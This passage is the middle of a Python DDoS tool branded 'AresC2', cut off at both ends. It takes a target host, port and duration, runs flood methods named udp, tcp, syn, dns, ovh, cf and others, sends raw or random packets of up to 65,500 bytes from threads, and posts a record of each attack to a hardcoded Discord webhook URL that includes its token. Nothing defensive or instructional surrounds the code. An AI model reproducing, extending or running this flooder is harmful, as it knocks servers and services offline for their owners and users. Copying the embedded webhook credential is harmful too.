            time.sleep(0.1)
            os.system ("clear")
            print (welcome2)
            time.sleep(0.1)
            os.system ("clear")
            print (welcome3)
            time.sleep(0.1)
            os.system ("clear")
            print (welcome4)
            time.sleep(0.1)
            os.system ("clear")
            print (welcome5)
            time.sleep(0.1)
            os.system ("clear")
            print (plan)
            main()
        elif sinput == "leave":
            os.system("clear")
            print(send1)
            time.sleep(0.9)
            os.system("clear")
            print(send2)
            time.sleep(0.9)
            os.system("clear")
            print(send3)
            time.sleep(0.9)
            os.system("clear")
            print(send4)
            time.sleep(0.9)
            os.system("clear")
            print(send5)
            time.sleep(0.9)
            os.system("clear")
            print(send6)
            time.sleep(0.9)
            os.system("clear")
            print(send7)
            time.sleep(0.9)
            os.system("clear")
            print(send8)
            time.sleep(0.9)

           
            os.system ("clear")
            exit()

        elif sinput == "layer4":
            os.system("clear")
            print(layer4)
            main()

        elif sinput == "layer7":
            os.system("clear")
            print(layer7)
            main()


        elif sinput == "attack":
            target, thread, t = get_info()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchCFB(target, thread, t)
            webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1133454576243195945/bTLPsdzB5f86yrsVnfFmwdstjdEwHmPbsB8ruscgCvJvCZ7-i-A-xQ8Cmnn6J1YopMG4", username="AresC2")

            embed = DiscordEmbed(title=" :zap: Sending Attack! :zap:", value=f'Sending Attack By User __root__', color=0xe74c3c)

            embed.set_timestamp()
            embed.set_footer(text="©️ AresC2")
            embed.add_embed_field(name='**__Host__**', value=f'{target}')
            embed.add_embed_field(name='**__Thread__**', value=f'{thread}')
            embed.add_embed_field(name='**__Time__**', value=f'{t}')
            embed.add_embed_field(name='**__Methods__**', value='attack')

            webhook.add_embed(embed)
            response = webhook.execute()

            timer.join()

        elif sinput == "udp":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 1021
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
                    os.system("clear")
                    print(start)
                    time.sleep(1)
                    os.system("clear")
                    print(start2)
                    time.sleep(1)
                    os.system("clear")
                    print(start3)
                    time.sleep(1)
                    os.system("clear")
                    print(start4)
                    time.sleep(1)
                    os.system("clear")
                    print(start5)
                    time.sleep(1)
                    os.system("clear")
                    print(start6)
                    time.sleep(1)
                    os.system("clear")
                    print(start7)
                    time.sleep(1)
                    os.system("clear")
                    print(start8)
                    time.sleep(1)
                    os.system("clear")
                    print(start9)
                    time.sleep(1)
                    os.system("clear")
                    print(start10)
                    time.sleep(1)
                    os.system("clear")
                    print(f"""
\033[95m╦═════════════════╦═══════════════════╦
        \033[95mTARGET: \033[97m[\033[95m%s\033[97m]  
        \033[95mPORT: \033[97m[\033[95m%s\033[97m]
        \033[95mTIME: \033[97m[\033[95m%s\033[97m]
        \033[95mMETHODS: \033[97m[\033[95mudp\033[97m]
\033[95m═══════════════════════════════════════

        \033[95mUSERNAME: \033[97m[\033[95m{username}\033[97m]
        \033[95mVIP : \033[97m[\033[92mTRUE\033[93m\033[97m]

\033[95m╩═══════════════════╩═════════════════╩
                        """%(host,port,timer))

                    webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1133454576243195945/bTLPsdzB5f86yrsVnfFmwdstjdEwHmPbsB8ruscgCvJvCZ7-i-A-xQ8Cmnn6J1YopMG4", username="AresC2")

                    embed = DiscordEmbed(title=" :zap: Sending Attack! :zap:", value=f'Sending Attack By User __root__', color=0xe74c3c)

                    embed.set_timestamp()
                    embed.set_footer(text="©️ AresC2")
                    embed.add_embed_field(name='**__Host__**', value=f'{host}')
                    embed.add_embed_field(name='**__Time__**', value=f'{timer}')
                    embed.add_embed_field(name='**__Port__**', value=f'{port}')
                    embed.add_embed_field(name='**__Methods__**', value='udp')

                    webhook.add_embed(embed)
                    response = webhook.execute()

                    print(attacked)

            except ValueError:
                main()
            except socket.gaierror:
                main()


        elif sinput == "dns":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                    threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
                    os.system("clear")
                    print(start)
                    time.sleep(1)
                    os.system("clear")
                    print(start2)
                    time.sleep(1)
                    os.system("clear")
                    print(start3)
                    time.sleep(1)
                    os.system("clear")
                    print(start4)
                    time.sleep(1)
                    os.system("clear")
                    print(start5)
                    time.sleep(1)
                    os.system("clear")
                    print(start6)
                    time.sleep(1)
                    os.system("clear")
                    print(start7)
                    time.sleep(1)
                    os.system("clear")
                    print(start8)
                    time.sleep(1)
                    os.system("clear")
                    print(start9)
                    time.sleep(1)
                    os.system("clear")
                    print(start10)
                    time.sleep(1)
                    os.system("clear")
                    print(f"""
\033[95m╦═════════════════╦═══════════════════╦
        \033[95mTARGET: \033[97m[\033[95m%s\033[97m]  
        \033[95mPORT: \033[97m[\033[95m%s\033[97m]
        \033[95mTIME: \033[97m[\033[95m%s\033[97m]
        \033[95mMETHODS: \033[97m[\033[95mdns\033[97m]
\033[95m═══════════════════════════════════════

        \033[95mUSERNAME: \033[97m[\033[95m{username}\033[97m]
        \033[95mVIP : \033[97m[\033[92mTRUE\033[93m\033[97m]

\033[95m╩═══════════════════╩═════════════════╩
                        """%(host,port,timer))
                    
                    print(attacked)

                    webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1133454576243195945/bTLPsdzB5f86yrsVnfFmwdstjdEwHmPbsB8ruscgCvJvCZ7-i-A-xQ8Cmnn6J1YopMG4", username="AresC2")

                    embed = DiscordEmbed(title=" :zap: Sending Attack! :zap:", value=f'Sending Attack By User __root__', color=0xe74c3c)

                    embed.set_timestamp()
                    embed.set_footer(text="©️ AresC2")
                    embed.add_embed_field(name='**__Host__**', value=f'{host}')
                    embed.add_embed_field(name='**__Time__**', value=f'{timer}')
                    embed.add_embed_field(name='**__Port__**', value=f'{port}')
                    embed.add_embed_field(name='**__Methods__**', value='dns')

                    webhook.add_embed(embed)
                    response = webhook.execute()


            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "syn":
            try:
                if running >= 1000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                        sinput, host, timer, port = sin.split(" ")
                        socket.gethostbyname(host)
                        payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
                        threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
                        os.system("clear")
                        print(start)
                        time.sleep(1)
                        os.system("clear")
                        print(start2)
                        time.sleep(1)
                        os.system("clear")
                        print(start3)
                        time.sleep(1)
                        os.system("clear")
                        print(start4)
                        time.sleep(1)
                        os.system("clear")
                        print(start5)
                        time.sleep(1)
                        os.system("clear")
                        print(start6)
                        time.sleep(1)
                        os.system("clear")
                        print(start7)
                        time.sleep(1)
                        os.system("clear")
                        print(start8)
                        time.sleep(1)
                        os.system("clear")
                        print(start9)
                        time.sleep(1)
                        os.system("clear")
                        print(start10)
                        os.system("clear")
                        print(f"""
\033[95m╦═════════════════╦═══════════════════╦
        \033[95mTARGET: \033[97m[\033[95m%s\033[97m]  
        \033[95mPORT: \033[97m[\033[95m%s\033[97m]
        \033[95mTIME: \033[97m[\033[95m%s\033[97m]
        \033[95mMETHODS: \033[97m[\033[95msyn\033[97m]
\033[95m═══════════════════════════════════════

        \033[95mUSERNAME: \033[97m[\033[95m{username}\033[97m]
        \033[95mVIP : \033[97m[\033[92mTRUE\033[93m\033[97m]

\033[95m╩═══════════════════╩═════════════════╩
                        """%(host,port,timer))


            except ValueError: 
                main()
            except socket.gaierror:
                main()

        elif sinput == "udpbypass":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 65500
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
                    os.system("clear")
                    print(start)
                    time.sleep(1)
                    os.system("clear")
                    print(start2)
                    time.sleep(1)
                    os.system("clear")
                    print(start3)
                    time.sleep(1)
                    os.system("clear")
                    print(start4)
                    time.sleep(1)
                    os.system("clear")
                    print(start5)
                    time.sleep(1)
                    os.system("clear")
                    print(start6)
                    time.sleep(1)
                    os.system("clear")
                    print(start7)
                    time.sleep(1)
                    os.system("clear")
                    print(start8)
                    time.sleep(1)
                    os.system("clear")
                    print(start9)
                    time.sleep(1)
                    os.system("clear")
                    print(start10)
                    time.sleep(1)
                    os.system("clear")
                    print(f"""
\033[95m╦═════════════════╦═══════════════════╦
        \033[95mTARGET: \033[97m[\033[95m%s\033[97m]  
        \033[95mPORT: \033[97m[\033[95m%s\033[97m]
        \033[95mTIME: \033[97m[\033[95m%s\033[97m]
        \033[95mMETHODS: \033[97m[\033[95mudpbypass\033[97m]
\033[95m═══════════════════════════════════════

        \033[95mUSERNAME: \033[97m[\033[95m{username}\033[97m]
        \033[95mVIP : \033[97m[\033[92mTRUE\033[93m\033[97m]

\033[95m╩═══════════════════╩═════════════════╩
                        """%(host,port,timer))                    
                    print(attacked)

                    webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1133454576243195945/bTLPsdzB5f86yrsVnfFmwdstjdEwHmPbsB8ruscgCvJvCZ7-i-A-xQ8Cmnn6J1YopMG4", username="AresC2")

                    embed = DiscordEmbed(title=" :zap: Sending Attack! :zap:", value=f'Sending Attack By User __root__', color=0xe74c3c)

                    embed.set_timestamp()
                    embed.set_footer(text="©️ AresC2")
                    embed.add_embed_field(name='**__Host__**', value=f'{host}')
                    embed.add_embed_field(name='**__Time__**', value=f'{timer}')
                    embed.add_embed_field(name='**__Port__**', value=f'{port}')
                    embed.add_embed_field(name='**__Methods__**', value='udpbypass')

                    webhook.add_embed(embed)
                    response = webhook.execute()

            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "tcp":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 20179
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
                    os.system("clear")
                    print(start)
                    time.sleep(1)
                    os.system("clear")
                    print(start2)
                    time.sleep(1)
                    os.system("clear")
                    print(start3)
                    time.sleep(1)
                    os.system("clear")
                    print(start4)
                    time.sleep(1)
                    os.system("clear")
                    print(start5)
                    time.sleep(1)
                    os.system("clear")
                    print(start6)
                    time.sleep(1)
                    os.system("clear")
                    print(start7)
                    time.sleep(1)
                    os.system("clear")
                    print(start8)
                    time.sleep(1)
                    os.system("clear")
                    print(start9)
                    time.sleep(1)
                    os.system("clear")
                    print(start10)
                    time.sleep(1)
                    os.system("clear")
                    print(f"""
\033[95m╦═════════════════╦═══════════════════╦
        \033[95mTARGET: \033[97m[\033[95m%s\033[97m]  
        \033[95mPORT: \033[97m[\033[95m%s\033[97m]
        \033[95mTIME: \033[97m[\033[95m%s\033[97m]
        \033[95mMETHODS: \033[97m[\033[95mtcp\033[97m]
\033[95m═══════════════════════════════════════

        \033[95mUSERNAME: \033[97m[\033[95m{username}\033[97m]
        \033[95mVIP : \033[97m[\033[92mTRUE\033[93m\033[97m]

\033[95m╩═══════════════════╩═════════════════╩
                        """%(host,port,timer))                    
                    print(attacked)

                    webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1133454576243195945/bTLPsdzB5f86yrsVnfFmwdstjdEwHmPbsB8ruscgCvJvCZ7-i-A-xQ8Cmnn6J1YopMG4", username="AresC2")

                    embed = DiscordEmbed(title=" :zap: Sending Attack! :zap:", value=f'Sending Attack By User __root__', color=0xe74c3c)

                    embed.set_timestamp()
                    embed.set_footer(text="©️ AresC2")
                    embed.add_embed_field(name='**__Host__**', value=f'{host}')
                    embed.add_embed_field(name='**__Time__**', value=f'{timer}')
                    embed.add_embed_field(name='**__Port__**', value=f'{port}')
                    embed.add_embed_field(name='**__Methods__**', value='tcp')

                    webhook.add_embed(embed)
                    response = webhook.execute()


            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "cf":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 65500
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
                    os.system("clear")
                    print(start)
                    time.sleep(1)
                    os.system("clear")
                    print(start2)
                    time.sleep(1)
                    os.system("clear")
                    print(start3)
                    time.sleep(1)
                    os.system("clear")
                    print(start4)
                    time.sleep(1)
                    os.system("clear")
                    print(start5)
                    time.sleep(1)
                    os.system("clear")
                    print(start6)
                    time.sleep(1)
                    os.system("clear")
                    print(start7)
                    time.sleep(1)
                    os.system("clear")
                    print(start8)
                    time.sleep(1)
                    os.system("clear")
                    print(start9)
                    time.sleep(1)
                    os.system("clear")
                    print(start10)
                    time.sleep(1)
                    os.system("clear")
                    print(f"""
\033[95m╦═════════════════╦═══════════════════╦
        \033[95mTARGET: \033[97m[\033[95m%s\033[97m]  
        \033[95mPORT: \033[97m[\033[95m%s\033[97m]
        \033[95mTIME: \033[97m[\033[95m%s\033[97m]
        \033[95mMETHODS: \033[97m[\033[95mcf\033[97m]
\033[95m═══════════════════════════════════════

        \033[95mUSERNAME: \033[97m[\033[95m{username}\033[97m]
        \033[95mVIP : \033[97m[\033[92mTRUE\033[93m\033[97m]

\033[95m╩═══════════════════╩═════════════════╩
                        """%(host,port,timer))
                    print(attacked)

                    webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1133454576243195945/bTLPsdzB5f86yrsVnfFmwdstjdEwHmPbsB8ruscgCvJvCZ7-i-A-xQ8Cmnn6J1YopMG4", username="AresC2")

                    embed = DiscordEmbed(title=" :zap: Sending Attack! :zap:", value=f'Sending Attack By User __root__', color=0xe74c3c)

                    embed.set_timestamp()
                    embed.set_footer(text="©️ AresC2")
                    embed.add_embed_field(name='**__Host__**', value=f'{host}')
                    embed.add_embed_field(name='**__Time__**', value=f'{timer}')
                    embed.add_embed_field(name='**__Port__**', value=f'{port}')
                    embed.add_embed_field(name='**__Methods__**', value='cf')

                    webhook.add_embed(embed)
                    response = webhook.execute()

            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "ovh":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                        sinput, host, timer, port = sin.split(" ")
                        socket.gethostbyname(host)
                        payload = b"\x00\x02\x00\x2f"
                        threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
                        os.system("clear")
                        print(start)
                        time.sleep(1)
                        os.system("clear")
                        print(start2)
                        time.sleep(1)
                        os.system("clear")
                        print(start3)
                        time.sleep(1)
                        os.system("clear")
                        print(start4)
                        time.sleep(1)
                        os.system("clear")
                        print(start5)
                        time.sleep(1)
                        os.system("clear")
                        print(start6)
                        time.sleep(1)
                        os.system("clear")
                        print(start7)
                        time.sleep(1)
                        os.system("clear")
                        print(start8)
                        time.sleep(1)
                        os.system("clear")
                        print(start9)
                        time.sleep(1)
                        os.system("clear")
                        print(start10)
                        time.sleep(1)
                        os.system("clear")
                        print(f"""
\033[95m╦═════════════════╦═══════════════════╦
        \033[95mTARGET: \033[97m[\033[95m%s\033[97m]  
        \033[95mPORT: \033[97m[\033[95m%s\033[97m]
        \033[95mTIME: \033[97m[\033[95m%s\033[97m]
        \033[95mMETHODS: \033[97m[\033[95movh\033[97m]
\033[95m═══════════════════════════════════════

        \033[95mUSERNAME: \033[97m[\033[95m{username}\033[97m]
        \033[95mVIP : \033[97m[\033[92mTRUE\033[93m\033[97m]

\033[95m╩═══════════════════╩═════════════════╩
                        """%(host,port,timer))                    
                        print(attacked)


            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "cfb":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 65500
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
                    os.system("clear")
                    print(start)
                    time.sleep(1)
                    os.system("clear")
                    print(start2)
                    time.sleep(1)
                    os.system("clear")
                    print(start3)
                    time.sleep(1)
                    os.system("clear")
                    print(start4)
                    time.sleep(1)
                    os.system("clear")
                    print(start5)
                    time.sleep(1)
                    os.system("clear")
                    print(start6)
                    time.sleep(1)
                    os.system("clear")
                    print(start7)
                    time.sleep(1)
                    os.system("clear")
                    print(start8)
                    time.sleep(1)
                    os.system("clear")
                    print(start9)
                    time.sleep(1)
                    os.system("clear")
                    print(start10)
                    time.sleep(1)
                    os.system("clear")
                    print(f"""
\033[95m╦═════════════════╦═══════════════════╦
        \033[95mTARGET: \033[97m[\033[95m%s\033[97m]  
        \033[95mPORT: \033[97m[\033[95m%s\033[97m]
        \033[95mTIME: \033[97m[\033[95m%s\033[97m]
        \033[95mMETHODS: \033[97m[\033[95mcfb\033[97m]
\033[95m═══════════════════════════════════════

        \033[95mUSERNAME: \033[97m[\033[95m{username}\033[97m]
        \033[95mVIP : \033[97m[\033[92mTRUE\033[93m\033[97m]

\033[95m╩═══════════════════╩═════════════════╩
                        """%(host,port,timer))                 
                    print(attacked)
                    webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1133454576243195945/bTLPsdzB5f86yrsVnfFmwdstjdEwHmPbsB8ruscgCvJvCZ7-i-A-xQ8Cmnn6J1YopMG4", username="AresC2")

                    embed = DiscordEmbed(title=" :zap: Sending Attack! :zap:", value=f'Sending Attack By User __root__', color=0xe74c3c)

                    embed.set_timestamp()
                    embed.set_footer(text="©️ AresC2")
                    embed.add_embed_field(name='**__Host__**', value=f'{host}')
                    embed.add_embed_field(name='**__Time__**', value=f'{timer}')
                    embed.add_embed_field(name='**__Port__**', value=f'{port}')
                    embed.add_embed_field(name='**__Methods__**', value='cfb')

                    webhook.add_embed(embed)
                    response = webhook.execute()

            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "ovhkill":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                    threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()               
                    os.system("clear")
                    print(f"""
\033[95m╦═════════════════╦═══════════════════╦
        \033[95mTARGET: \033[97m[\033[95m%s\033[97m]  
        \033[95mPORT: \033[97m[\033[95m%s\033[97m]
        \033[95mTIME: \033[97m[\033[95m%s\033[97m]
        \033[95mMETHODS: \033[97m[\033[95movhkill\033[97m]
\033[95m═══════════════════════════════════════

        \033[95mUSERNAME: \033[97m[\033[95m{username}\033[97m]
        \033[95mVIP : \033[97m[\033[92mTRUE\033[93m\033[97m]

\033[95m╩═══════════════════╩═════════════════╩
                        """%(host,port,timer))
                    print(attacked)

                    webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1133454576243195945/bTLPsdzB5f86yrsVnfFmwdstjdEwHmPbsB8ruscgCvJvCZ7-i-A-xQ8Cmnn6J1YopMG4", username="AresC2")

                    embed = DiscordEmbed(title=" :zap: Sending Attack! :zap:", value=f'Sending Attack By User __root__', color=0xe74c3c)

                    embed.set_timestamp()
                    embed.set_footer(text="©️ AresC2")
                    embed.add_embed_field(name='**__Host__**', value=f'{host}')
                    embed.add_embed_field(name='**__Time__**', value=f'{timer}')
                    embed.add_embed_field(name='**__Port__**', value=f'{port}')
                    embed.add_embed_field(name='**__Methods__**', value='ovhkill')

                    webhook.add_embed(embed)
                    response = webhook.execute()


            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "ovh-down":
            try:
                if running >= 120345:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                    threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
                    os.system("clear")
                    print(f"""
\033[95m╦═════════════════╦═══════════════════╦
        \033[95mTARGET: \033[97m[\033[95m%s\033[97m]  
        \033[95mPORT: \033[97m[\033[95m%s\033[97m]
        \033[95mTIME: \033[97m[\033[95m%s\033[97m]
        \033[95mMETHODS: \033[97m[\033[95movhdown\033[97m]
\033[95m═══════════════════════════════════════

        \033[95mUSERNAME: \033[97m[\033[95m{username}\033[97m]
        \033[95mVIP : \033[97m[\033[92mTRUE\033[93m\033[97m]

\033[95m╩═══════════════════╩═════════════════╩
                        """%(host,port,timer))
                    print(attacked)
                    webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1133454576243195945/bTLPsdzB5f86yrsVnfFmwdstjdEwHmPbsB8ruscgCvJvCZ7-i-A-xQ8Cmnn6J1YopMG4", username="AresC2")

                    embed = DiscordEmbed(title=" :zap: Sending Attack! :zap:", value=f'Sending Attack By User __root__', color=0xe74c3c)

                    embed.set_timestamp()
                    embed.set_footer(text="©️ AresC2")
                    embed.add_embed_field(name='**__Host__**', value=f'{host}')
                    embed.add_embed_field(name='**__Time__**', value=f'{timer}')
                    embed.add_embed_field(name='**__Port__**', value=f'{port}')
                    embed.add_embed_field(name='**__Methods__**', value='ovhdown')

                    webhook.add_embed(embed)
                    response = webhook.execute()

            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "home":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 6048
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
                    os.system("clear")
                    print(start)
                    time.sleep(1)
                    os.system("clear")
                    print(start2)
                    time.sleep(1)
                    os.system("clear")
                    print(start3)
                    time.sleep(1)
                    os.system("clear")
                    print(start4)
                    time.sleep(1)
                    os.system("clear")
                    print(start5)
                    time.sleep(1)
                    os.system("clear")
                    print(start6)
                    time.sleep(1)
                    os.system("clear")
                    print(start7)
                    time.sleep(1)
                    os.system("clear")
                    print(start8)
                    time.sleep(1)
                    os.system("clear")
                    print(start9)
                    time.sleep(1)
                    os.system("clear")
                    print(start10)
                    time.sleep(1)
                    os.system("clear")
                    print(f"""
\033[95m╦═════════════════╦═══════════════════╦
        \033[95mTARGET: \033[97m[\033[95m%s\033[97m]  
        \033[95mPORT: \033[97m[\033[95m%s\033[97m]
        \033[95mTIME: \033[97m[\033[95m%s\033[97m]
        \033[95mMETHODS: \033[97m[\033[95mhome\033[97m]
\033[95m═══════════════════════════════════════

        \033[95mUSERNAME: \033[97m[\033[95m{username}\033[97m]
        \033[95mVIP : \033[97m[\033[92mTRUE\033[93m\033[97m]

\033[95m╩═══════════════════╩═════════════════╩
                        """%(host,port,timer))                    
                    print(attacked)
                    webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1133454576243195945/bTLPsdzB5f86yrsVnfFmwdstjdEwHmPbsB8ruscgCvJvCZ7-i-A-xQ8Cmnn6J1YopMG4", username="AresC2")

                    embed = DiscordEmbed(title=" :zap: Sending Attack! :zap:", value=f'Sending Attack By User __root__', color=0xe74c3c)

                    embed.set_timestamp()
                    embed.set_footer(text="©️ AresC2")
                    embed.add_embed_field(name='**__Host__**', value=f'{host}')
                    embed.add_embed_field(name='**__Time__**', value=f'{timer}')
                    embed.add_embed_field(name='**__Port__**', value=f'{port}')
                    embed.add_embed_field(name='**__Methods__**', value='home')

                    webhook.add_embed(embed)
                    response = webhook.execute()

            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "stresster":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 6048
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()

                    os.system("clear")
                    print(start)
                    time.sleep(1)
                    os.system("clear")
                    print(start2)
                    time.sleep(1)
                    os.system("clear")
                    print(start3)
                    time.sleep(1)
                    os.system("clear")
                    print(start4)
                    time.sleep(1)
                    os.system("clear")
                    print(start5)
                    time.sleep(1)
                    os.system("clear")
                    print(start6)
                    time.sleep(1)
                    os.system("clear")
                    print(start7)
                    time.sleep(1)
                    os.system("clear")
                    print(start8)
                    time.sleep(1)
                    os.system("clear")
                    print(start9)
                    time.sleep(1)
                    os.system("clear")
                    print(start10)
                    time.sleep(1)
                    os.system("clear")
                    print(f"""
\033[95m╦═════════════════╦═══════════════════╦
        \033[95mTARGET: \033[97m[\033[95m%s\033[97m]  
        \033[95mPORT: \033[97m[\033[95m%s\033[97m]
        \033[95mTIME: \033[97m[\033[95m%s\033[97m]
        \033[95mMETHODS: \033[97m[\033[95mstresster\033[97m]
\033[95m═══════════════════════════════════════

        \033[95mUSERNAME: \033[97m[\033[95m{username}\033[97m]
        \033[95mVIP : \033[97m[\033[92mTRUE\033[93m\033[97m]

\033[95m╩═══════════════════╩═════════════════╩
                        """%(host,port,timer))                 
                    print(attacked)
                    webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1133454576243195945/bTLPsdzB5f86yrsVnfFmwdstjdEwHmPbsB8ruscgCvJvCZ7-i-A-xQ8Cmnn6J1YopMG4", username="AresC2")

                    embed = DiscordEmbed(title=" :zap: Sending Attack! :zap:", value=f'Sending Attack By User __root__', color=0xe74c3c)

                    embed.set_timestamp()
                    embed.set_footer(text="©️ AresC2")
                    embed.add_embed_field(name='**__Host__**', value=f'{host}')
                    embed.add_embed_field(name='**__Time__**', value=f'{timer}')
                    embed.add_embed_field(name='**__Port__**', value=f'{port}')
                    embed.add_embed_field(name='**__Methods__**', value='stresster')

                    webhook.add_embed(embed)
                    response = webhook.execute()

            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "dstats-l7":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 6048
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()

                    os.system("clear")
                    print(start)
                    time.sleep(1)
                    os.system("clear")
                    print(start2)
                    time.sleep(1)
                    os.system("clear")
                    print(start3)
                    time.sleep(1)
                    os.system("clear")
                    print(start4)
                    time.sleep(1)
                    os.system("clear")
                    print(start5)
                    time.sleep(1)
                    os.system("clear")
                    print(start6)
                    time.sleep(1)
                    os.system("clear")
                    print(start7)
                    time.sleep(1)
                    os.system("clear")
                    print(start8)
                    time.sleep(1)
                    os.system("clear")
                    print(start9)
                    time.sleep(1)
                    os.system("clear")
                    print(start10)
                    time.sleep(1)
                    os.system("clear")
                    print(f"""
\033[95m╦═════════════════╦═══════════════════╦
        \033[95mTARGET: \033[97m[\033[95m%s\033[97m]  
        \033[95mPORT: \033[97m[\033[95m%s\033[97m]
        \033[95mTIME: \033[97m[\033[95m%s\033[97m]
        \033[95mMETHODS: \033[97m[\033[95mdstats-l7\033[97m]
\033[95m═══════════════════════════════════════

        \033[95mUSERNAME: \033[97m[\033[95m{username}\033[97m]
        \033[95mVIP : \033[97m[\033[92mTRUE\033[93m\033[97m]

\033[95m╩═══════════════════╩═════════════════╩
                        """%(host,port,timer))                 
                    print(attacked)
                    webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1133454576243195945/bTLPsdzB5f86yrsVnfFmwdstjdEwHmPbsB8ruscgCvJvCZ7-i-A-xQ8Cmnn6J1YopMG4", username="AresC2")

                    embed = DiscordEmbed(title=" :zap: Sending Attack! :zap:", value=f'Sending Attack By User __root__', color=0xe74c3c)

                    embed.set_timestamp()
                    embed.set_footer(text="©️ AresC2")
                    embed.add_embed_field(name='**__Host__**', value=f'{host}')
                    embed.add_embed_field(name='**__Time__**', value=f'{timer}')
                    embed.add_embed_field(name='**__Port__**', value=f'{port}')
                    embed.add_embed_field(name='**__Methods__**', value='dstats-l7')

                    webhook.add_embed(embed)
                    response = webhook.execute()

            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "http-stm":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 65500
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()

                    os.system("clear")
                    print(start)
                    time.sleep(1)
                    os.system("clear")
                    print(start2)
                    time.sleep(1)
                    os.system("clear")
                    print(start3)
                    time.sleep(1)
                    os.system("clear")
                    print(start4)
                    time.sleep(1)
                    os.system("clear")
                    print(start5)
                    time.sleep(1)
                    os.system("clear")
                    print(start6)
                    time.sleep(1)
                    os.system("clear")
                    print(start7)
                    time.sleep(1)
